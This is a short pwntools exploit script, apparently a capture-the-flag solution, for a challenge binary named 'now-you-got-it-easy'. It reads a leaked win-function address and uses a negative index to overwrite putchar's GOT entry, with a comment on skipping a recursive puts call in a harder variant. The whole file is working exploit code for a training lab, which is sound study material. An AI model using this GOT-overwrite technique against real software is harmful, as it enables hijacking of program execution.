from pwn import *

context.binary = elf = ELF('/challenge/now-you-got-it-easy')

io = elf.process()

io.recvuntil(b'win is located at: ')
win_addr = int(io.recvline().strip(), 16)
print(f'[+] win addr: {hex(win_addr)}')

io.sendline(b'-122')            # got of putchar

'''
NOTE: within hard one, the puts call at begin of win(), so direct overwrite the puts()'s got will cause recursive
we can jump over that puts call by + 20 offset
'''
io.sendline(str(win_addr).encode()) # cause scanf("%lld") which expect long long

io.interactive()
